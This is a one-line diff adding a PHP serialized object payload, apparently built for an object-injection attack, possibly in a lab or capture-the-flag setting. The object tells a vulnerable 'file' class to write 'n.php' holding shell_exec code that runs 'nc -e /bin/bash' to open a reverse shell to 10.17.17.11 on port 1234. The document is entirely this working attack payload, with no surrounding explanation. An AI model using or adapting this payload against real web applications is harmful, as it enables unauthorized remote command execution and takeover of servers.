@@ -1,0 +1,1 @@
+O:4:"file":2:{s:4:"file";s:5:"n.php";s:4:"data";s:56:"<?php shell_exec("nc -e /bin/bash 10.17.17.11 1234"); ?>";}
